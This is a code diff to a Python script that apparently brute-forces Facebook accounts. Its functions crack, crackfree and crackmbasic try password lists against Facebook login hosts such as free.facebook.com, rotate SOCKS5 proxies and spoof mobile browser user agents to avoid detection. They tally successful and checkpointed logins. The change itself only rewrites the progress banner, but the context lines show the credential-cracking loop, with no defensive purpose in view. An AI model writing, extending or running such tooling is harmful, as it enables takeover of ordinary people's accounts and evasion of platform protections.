@@ -956,7 +956,7 @@ def crack(idf,pwv,nmf):
 	nip=random.choice(prox)
 	ses=requests.Session()
 	proxs= {'http': 'socks5://'+nip}
-	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s SHIN %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			secua=re.findall(' Chrome/(.*?)Mobile Safari/537.36',str(ua))[0].split('.')[0]
@@ -1084,7 +1084,7 @@ def crackfree(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s SHIN %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -1250,7 +1250,7 @@ def crackmbasic(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s SHIN %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 
